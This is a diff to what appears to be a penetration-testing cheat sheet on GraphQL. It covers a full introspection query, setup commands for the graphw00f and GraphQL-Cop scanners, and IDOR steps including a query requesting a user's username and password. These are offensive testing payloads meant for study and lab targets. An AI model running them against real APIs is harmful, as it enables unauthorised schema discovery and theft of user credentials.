@@ -58,35 +58,35 @@ Introspection is a GraphQL feature that enables users to query the GraphQL API a
 
 **General Introspection**
 ```json
-query IntrospectionQuery {
-  __schema {
-    queryType { name }
-    mutationType { name }
-    subscriptionType { name }
-    types { ...FullType }
-    directives {
-      name
-      description
-      locations
-      args { ...InputValue }
+  query IntrospectionQuery {
+    __schema {
+      queryType { name }
+      mutationType { name }
+      subscriptionType { name }
+      types { ...FullType }
+      directives {
+        name
+        description
+        locations
+        args { ...InputValue }
+      }
     }
   }
-}
-fragment FullType on __Type {
-  kind name description
-  fields(includeDeprecated: true) {
-    name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason
+  fragment FullType on __Type {
+    kind name description
+    fields(includeDeprecated: true) {
+      name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason
+    }
+    inputFields { ...InputValue }
+    interfaces { ...TypeRef }
+    enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
+    possibleTypes { ...TypeRef }
   }
-  inputFields { ...InputValue }
-  interfaces { ...TypeRef }
-  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
-  possibleTypes { ...TypeRef }
-}
-fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
-fragment TypeRef on __Type {
-  kind name
-  ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name }}}}}}}
-}
+  fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
+  fragment TypeRef on __Type {
+    kind name
+    ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name }}}}}}}
+  }
 ```
 
 ## Batching Example
@@ -136,40 +136,36 @@ cd graphw00f
 python3 main.py -f -d -t http://STMIP:STMPO
 ```
 
+### GraphQL-Cop
+
+```bash
+git clone https://github.com/dolevf/graphql-cop
+cd graphql-cop
+python3 -m venv path/to/venv
+source path/to/venv/bin/activate
+python3 -m pip install -r requirements.txt
+python3 graphql-cop.py -h
+python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql
+```
+
 ## Insecure Direct Object Reference (IDOR)
 
 ### Identifying IDOR
 
-Replace a query value with another we know exist:
+Replace a query value with another we know exists:
 ![identifying idor](../images/idor_2.png)
 
 ### Exploiting IDOR
 
-Replace query with introspection query to determine what data can be accessed (escape quotation marks on the below query)
+Replace query with introspection query to determine what data can be accessed
 ```json
-{
-  __type(name: "UserObject") {
-    name
-    fields {
-      name
-      type {
-        name
-        kind
-      }
-    }
-  }
-}
+{"query":"{  __type(name: \"allProducts\") {    name    fields {      name      type {        name        kind      }    }  }}"}
 ```
 
 Adjust query to test if previously determined data fields are accessible
 
 ```json
-{
-  user(username: "test") {
-    username
-    password
-  }
-}
+{  user(username: "test") {    username    password  }}
 ```
 
 ## Injection Attacks
